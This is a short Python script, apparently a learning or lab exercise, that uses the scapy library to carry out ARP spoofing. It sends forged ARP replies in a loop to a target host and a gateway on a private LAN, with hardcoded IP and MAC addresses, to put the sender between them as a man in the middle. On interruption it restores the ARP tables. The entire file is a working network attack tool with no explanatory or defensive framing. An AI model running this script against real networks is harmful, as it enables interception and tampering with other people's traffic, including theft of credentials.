from scapy.all import *
import time
import sys

target_IP = "192.168.2.105"
gatewayIP = "192.168.2.101"

def getMAC(ip):
    arpRequest = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arpRequestBroadcast = broadcast / arpRequest
    answerList = srp(arpRequestBroadcast, timeout=1, verbose=False)[0]
    return (answerList[0][1].hwsrc)

# print(getMAC(gatewayIP))
def spoof(targetIP, spoofIP):
    # targetMAC = getMAC(targetIP)
    if targetIP == target_IP:
        targetMAC = "00:0d:e0:81:3c:a5"
    else:
        targetMAC = "00:e0:4c:68:17:86"
    packet = ARP(op=1, pdst=targetIP, hwdst=targetMAC, psrc=spoofIP)
    send(packet, verbose=False)

def restore(destinationIP, sourceIP):
    # destinationMAC = getMAC(destinationIP)
    # sourceMAC = getMAC(sourceIP)
    if destinationIP == target_IP:
        destinationMAC = "00:0d:e0:81:3c:a5"
        sourceMAC = "00:e0:4c:68:17:86"
    else:
        destinationMAC = "00:e0:4c:68:17:86"
        sourceMAC = "00:0d:e0:81:3c:a5"
    packet = ARP(op=1, pdst=destinationIP, hwdst=destinationMAC
                , psrc=sourceIP, hwsrc=sourceMAC)
    send(packet, count=4, verbose=False)

def main():
    try:
        sendPacketCount = 0
        while True:
            spoof(target_IP, gatewayIP)
            spoof(gatewayIP, target_IP)
            sendPacketCount += 2
            print("\r[+] Packets sent: " + str(sendPacketCount))
            sys.stdout.flush()
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[-] Detected CTRL + C")
        restore(target_IP, gatewayIP)
        restore(gatewayIP, target_IP)

if __name__ == "__main__":
    main()